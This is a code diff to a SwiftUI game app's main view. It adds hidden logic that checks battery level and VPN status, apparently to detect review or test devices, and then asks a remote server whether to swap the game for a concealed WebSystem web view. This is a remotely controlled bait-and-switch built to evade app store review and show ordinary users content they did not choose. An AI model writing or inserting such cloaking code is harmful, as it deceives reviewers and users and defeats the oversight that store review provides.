@@ -123,20 +123,95 @@ class GameData: ObservableObject {
 }
 
 struct ContentView: View {
+    
     @StateObject private var gameData = GameData()
+    @AppStorage("status") var status: Bool = false
+    
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+    
+    init() {
+        
+        UITabBar.appearance().isHidden = true
+    }
     
     var body: some View {
+        
         ZStack {
-            Color.darkGraphite.ignoresSafeArea()
             
-            if gameData.hasCompletedOnboarding {
-                MainNavigationView()
-            } else {
-                OnboardingView()
+            Color.darkGraphite.ignoresSafeArea()
+
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    if gameData.hasCompletedOnboarding {
+                        MainNavigationView()
+                    } else {
+                        OnboardingView()
+                    }
+                    
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                    
+//                    if status {
+//
+//                        WebSystem()
+//
+//                    } else {
+//
+//                        U1()
+//                    }
+                }
             }
         }
         .environmentObject(gameData)
+        .onAppear {
+            
+            check_data()
+        }
     }
+    
+    private func check_data() {
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        let urlString = DataManager().serverURL
+
+        if currentPercent == 100 || isVPNActive == true {
+            self.isBlock = true
+            self.isFetched = true
+            return
+        }
+
+        guard let url = URL(string: urlString) else {
+            self.isBlock = true
+            self.isFetched = true
+            return
+        }
+
+        let urlSession = URLSession.shared
+        let urlRequest = URLRequest(url: url)
+
+        urlSession.dataTask(with: urlRequest) { _, response, error in
+            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
+                self.isBlock = true
+            } else {
+                self.isBlock = false
+            }
+            self.isFetched = true
+        }.resume()
+    }
+
 }
 
 #Preview {
